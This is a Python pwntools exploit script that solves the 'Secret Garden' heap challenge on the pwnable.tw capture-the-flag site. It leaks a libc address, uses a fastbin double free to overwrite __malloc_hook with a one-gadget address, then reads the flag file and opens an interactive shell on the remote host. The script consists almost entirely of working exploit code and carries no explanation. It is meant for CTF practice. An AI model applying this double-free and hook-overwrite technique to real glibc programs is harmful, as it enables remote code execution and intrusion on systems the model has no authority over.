# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './secretgarden_'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = 'chall.pwnable.tw'
port = '10203'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file,env={'LD_PRELOAD':'./libc_64.so.6'})
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)

def add(length, name, color):
    sla("choice : ", '1')
    sla("name :", str(length))
    sea("flower :", name)
    sea("flower :", color)

def visit():
    sla("choice : ", '2')

def remove(index):
    sla("choice : ", '3')
    sla("garden:", str(index))

def clean():
    sla("choice : ", '4')
    
add(0x88, "Mask0\n", "black\n")
add(0x18, "Mask1\n", "white\n")
remove(0)
add(0x58, '\x01', 'black\n')
add(0x68, "Mask3\n", "black\n")
add(0x68, "Mask4\n", "black\n")
add(0x18, "Mask5\n", "black\n")
add(0x18, "Mask6\n", "black\n")

visit()
ru("Name of the flower[2] :")
libc.address = un64(rn(6)) - 0x3c3b01
print hex(libc.address)
remove(3)
remove(4)
remove(3)
add(0x68, p64(libc.address + 0x3c3aed), "black\n")
add(0x68, "Mask4\n", "black\n")
add(0x68, "Mask4\n", "black\n")
add(0x68, 'a'*0xb + p64(libc.address + 0xef6c4) + p64(libc.address + 0x83B24), "black\n")
dbg()
sla("choice : ", '1')
log.success(hex(libc.address))
sl("cat /home/*/flag")
rc()
shell()